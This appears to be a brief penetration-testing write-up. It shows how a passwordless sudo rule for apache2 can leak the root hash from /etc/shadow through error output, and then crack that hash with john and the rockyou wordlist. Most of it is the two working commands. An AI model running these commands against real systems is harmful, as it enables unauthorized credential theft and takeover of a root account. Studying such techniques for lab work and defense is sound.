# Abusing attended functionality

This allows running `apache2` as root without password. Apache config files can `Include` arbitrary files, so we can read root-only files through error output.

![image.png](<../../../.gitbook/assets/image (1) (1) (1) (1) (1).png>)

```bash
sudo /usr/sbin/apache2 -f /etc/shadow
```

which case error but hashed of root is leaked

then unshadow and crack hash

<figure><img src="../../../.gitbook/assets/image 1 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
john shadow1 --wordlist=~/wordlist/rockyou.txt --pot=deleteme.pot
```

we use this option `--pot=deleteme.pot` to force john start crack again
